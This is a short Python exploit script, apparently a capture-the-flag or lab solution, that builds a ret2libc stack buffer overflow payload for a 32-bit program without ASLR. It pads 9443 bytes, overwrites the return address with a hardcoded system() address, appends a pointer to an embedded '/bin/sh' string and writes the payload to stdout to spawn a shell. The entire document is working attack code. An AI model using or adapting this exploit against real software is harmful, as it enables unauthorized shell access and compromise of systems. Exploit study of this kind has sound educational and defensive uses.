import os
import sys
import struct

# No ASLR system.
system = 0xf7e44190

def exploit(addr=0xffffaa85):
    # A's to clobber the buffer and the stack.
    exploit = b"A" * 9443

    # Junk to cover the old ebp.
    exploit += b"BBBB"

    # Address of system to overwrite return address.
    exploit += struct.pack("<I", system)

    # Stack pop? Misc junk? Not sure why this is needed?
    exploit += b"CCCC"

    # Pointer to a /bin/sh string.
    bin_sh_addr = struct.pack("<I", addr + 9447 + 12)
    print(bin_sh_addr, file=sys.stderr)
    exploit += bin_sh_addr

    # Shell string itself.
    exploit += b"/bin/sh\x00\n"

    os.write(1, exploit)
